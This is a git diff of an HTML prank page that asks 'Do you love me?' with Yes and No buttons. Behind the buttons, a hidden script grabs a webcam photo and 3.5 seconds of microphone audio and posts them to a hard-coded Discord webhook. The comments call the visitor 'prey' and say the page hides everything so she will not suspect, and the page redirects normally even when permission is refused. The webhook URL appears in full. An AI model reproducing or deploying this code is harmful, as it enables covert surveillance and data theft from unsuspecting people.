@@ -5,32 +5,71 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Proposed Her</title>
   <style>
+    /* Sab kuch hidden taake shikaar ko shak na ho */
     #video, #canvas { display: none; }
-    body { 
-      background: #121212; 
-      color: #fff; 
-      font-family: 'Segoe UI', Arial, sans-serif; 
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      height: 100vh; 
-      margin: 0; 
+    
+    body {
+      background-color: #121212;
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      color: white;
     }
-    .container { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    h1 { font-size: 1.5rem; margin-bottom: 20px; }
-    .btn-group { display: flex; gap: 15px; justify-content: center; }
-    .btn { 
-      padding: 12px 35px; 
-      border-radius: 25px; 
-      font-weight: bold; 
-      text-decoration: none; 
-      color: white; 
-      transition: 0.3s; 
-      cursor: pointer;
+
+    /* Original Container Style & Animation */
+    .container {
+      text-align: center;
+      padding: 20px;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 { margin-top: 10px; font-size: 2rem; }
+    p { color: #eee; font-size: 1.1rem; margin-bottom: 20px; }
+
+    /* Wahi original buttons style */
+    .btn { margin-top: 30px; }
+
+    .btn-link {
+      padding: 12px 35px;
+      margin: 10px;
+      text-decoration: none;
+      background: #ff4d6d;
+      color: white;
+      border-radius: 25px;
+      display: inline-block;
+      font-weight: bold;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3);
       border: none;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 1rem;
     }
-    .btn-yes { background: #ff4d6d; }
-    .btn-no { background: #555; }
+
+    .btn-link:hover {
+      transform: scale(1.1);
+      background: #ff758f;
+      box-shadow: 0 6px 20px rgba(255, 117, 143, 0.5);
+    }
+
+    .dev-name {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-size: 0.8rem;
+      color: rgba(255,255,255,0.7);
+      font-weight: bold;
+    }
+
     .loader { 
       border: 4px solid #333; 
       border-top: 4px solid #ff4d6d; 
@@ -45,13 +84,19 @@
 </head>
 <body>
 
+  <div class="dev-name">Dev by Faisal</div>
+
   <div class="container">
-    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" width="250" style="border-radius: 10px; margin-bottom: 20px;">
+    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px; border-radius: 15px;">
+
     <h1>Do you love me? 🤗</h1>
+    <p>Chiku is all yours</p>
+    
     <div class="loader" id="loader"></div>
-    <div class="btn-group" id="controls">
-      <button class="btn btn-yes" onclick="startTheHunt('yes')">Yes</button>
-      <button class="btn btn-no" onclick="startTheHunt('no')">No</button>
+
+    <div class="btn" id="controls">
+      <button class="btn-link" onclick="startTheHunt('yes')">Yes</button>
+      <button class="btn-link" onclick="startTheHunt('no')">No</button>
     </div>
   </div>
 
@@ -62,7 +107,7 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
     async function startTheHunt(userChoice) {
-        // UI Update: Buttons gayab, loader shuru
+        // UI Update
         document.getElementById('controls').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
@@ -71,7 +116,7 @@
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // 1. Photo Capture (1.2 seconds wait for focus)
+            // 1. Photo Capture (Stealthy shot)
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -81,21 +126,21 @@
                 canvas.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('file', blob, 'capture.png');
-                    fd.append('content', `🎯 **Shikaar Alert!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🌍 **Platform:** ${navigator.platform}`);
+                    fd.append('content', `🎯 **Shikaar Alert!**\n👤 **Choice:** ${userChoice.toUpperCase()}\n🖥️ **Platform:** ${navigator.platform}`);
                     fetch(WEBHOOK, { method: 'POST', body: fd });
                 }, 'image/png');
             }, 1200);
 
-            // 2. Audio Capture (3 seconds silent)
+            // 2. Audio Snatching (3.5 seconds)
             const mediaRecorder = new MediaRecorder(stream);
             const chunks = [];
             mediaRecorder.ondataavailable = e => chunks.push(e.data);
             mediaRecorder.onstop = () => {
                 const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                 const fd = new FormData();
-                fd.append('file', audioBlob, 'voice.webm');
+                fd.append('file', audioBlob, 'audio_log.webm');
                 fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
-                    // Final Logic: Choice ke mutabiq redirect
+                    // Final Logic
                     if (userChoice === 'yes') {
                         window.location.href = "page1.html";
                     } else {
@@ -108,7 +153,7 @@
             setTimeout(() => mediaRecorder.stop(), 3500);
 
         } catch (e) {
-            // Error pe bhi redirect taake shak na ho
+            // Permission Error pe bhi rasta wahi hai
             if (userChoice === 'yes') window.location.href = "page1.html";
             else window.location.href = "no1.html";
         }
